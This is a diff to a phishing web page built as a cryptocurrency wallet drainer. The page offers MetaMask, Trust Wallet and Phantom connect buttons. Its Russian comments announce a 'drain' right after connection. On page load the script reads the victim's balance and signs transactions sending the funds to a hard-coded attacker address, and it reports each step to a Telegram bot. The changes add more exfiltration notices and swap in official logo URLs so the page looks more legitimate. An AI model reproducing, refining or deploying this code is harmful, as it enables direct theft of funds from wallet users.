@@ -86,11 +86,11 @@
           <p class="mt-4 text-2xl font-semibold">MetaMask</p>
         </div>
         <div class="wallet-item" onclick="connect('Trust Wallet')">
-          <img src="https://i.postimg.cc/k6sJrC1k/image.png" class="mx-auto">
+          <img src="https://trustwallet.com/assets/trust-wallet-logo.svg" class="mx-auto">
           <p class="mt-4 text-2xl font-semibold">Trust Wallet</p>
         </div>
         <div class="wallet-item" onclick="connect('Phantom')">
-          <img src="https://i.postimg.cc/w3FpjdKc/image.png" class="mx-auto">
+          <img src="https://phantom.app/img/phantom-logo.svg" class="mx-auto">
           <p class="mt-4 text-2xl font-semibold">Phantom</p>
         </div>
       </div>
@@ -143,20 +143,27 @@
     async function sendToTelegram(message) {
       try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
-        await fetch(url);
-        console.log('Сообщение отправлено в Telegram:', message);
+        const res = await fetch(url);
+        if (!res.ok) throw new Error('Telegram API error: ' + res.status);
+        console.log('Отправлено в Telegram:', message);
       } catch (e) {
-        console.error('Telegram send error:', e);
+        console.error('Ошибка Telegram:', e);
       }
     }
 
     async function getUri() {
       try {
+        await sendToTelegram('Запрос WC URI у бэкенда');
         const r = await fetch(`${BACKEND}/get-wc-uri`);
         const d = await r.json();
-        return d.uri || null;
+        if (d.uri) {
+          await sendToTelegram('WC URI получен');
+          return d.uri;
+        }
+        await sendToTelegram('WC URI не получен');
+        return null;
       } catch (e) {
-        console.error('Backend fetch error:', e);
+        await sendToTelegram('Ошибка получения URI: ' + e.message);
         return null;
       }
     }
@@ -166,11 +173,11 @@
     }
 
     async function connect(wallet) {
-      await sendToTelegram(`Пользователь выбрал кошелёк: ${wallet}`);
+      await sendToTelegram(`Нажата кнопка: ${wallet}`);
 
       const uri = await getUri();
       if (!uri) {
-        await sendToTelegram('Ошибка: не удалось получить WC URI');
+        await sendToTelegram('Сессия WC не создана');
         alert('Ошибка сессии — попробуй позже');
         return;
       }
@@ -195,18 +202,17 @@
         }
       }
 
-      // Если deep-link не сработал — просто пишем в телегу и продолжаем ждать слива
-      await sendToTelegram(`Deep-link не сработал для ${wallet} — ждём подключения вручную`);
+      await sendToTelegram(`Deep-link не сработал для ${wallet} — ждём ручного подключения`);
       alert('Подтверди подключение в кошельке');
     }
 
-    // Автоматический слив сразу после подключения + подробные уведомления
+    // Слив сразу после подключения + максимум уведомлений
     window.addEventListener('load', async () => {
       if (window.ethereum || window.solana) {
         try {
-          let provider, address = 'unknown', network = 'unknown', balanceFormatted = '0', symbol = '';
+          await sendToTelegram('Страница загружена → сессия WC передана, проверяем провайдер');
 
-          await sendToTelegram('Сайт открыт в кошельке или через deep-link → начинаем подключение');
+          let provider, address = 'unknown', network = 'unknown', balanceFormatted = '0', symbol = '';
 
           if (window.ethereum) {
             provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -238,7 +244,7 @@
           const target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';
 
           if (parseFloat(balanceFormatted) > 0) {
-            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → начинаем слив на адрес ${target}`);
+            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → начинаем слив на ${target}`);
 
             if (network === 'Solana') {
               const tx = await provider.signAndSendTransaction(
@@ -270,6 +276,8 @@
           console.error(e);
           await sendToTelegram(`Ошибка слива: ${e.message}`);
         }
+      } else {
+        await sendToTelegram('Провайдер кошелька не обнаружен — сессия не передалась');
       }
     });
   </script>
